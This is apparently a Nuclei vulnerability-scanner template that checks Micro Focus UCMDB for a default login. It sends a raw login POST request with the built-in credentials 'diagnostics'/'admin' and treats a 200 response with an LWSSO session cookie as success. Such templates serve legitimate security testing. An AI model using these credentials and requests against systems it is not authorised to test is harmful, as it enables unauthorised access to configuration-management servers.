id: ucmdb-default-login

info:
  name: Micro Focus UCMDB Default Login
  author: dwisiswant0
  severity: high
  tags: ucmdb,default-login

requests:
  - raw:
      - |
        POST /ucmdb-ui/cms/loginRequest.do; HTTP/1.1
        Host: {{BaseURL}}

        customerID=1&isEncoded=false&userName=diagnostics&password={{base64(password)}}=&ldapServerName=UCMDB

    payloads:
      username:
        - diagnostics
      password:
        - admin
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "LWSSO_COOKIE_KEY"
        part: header
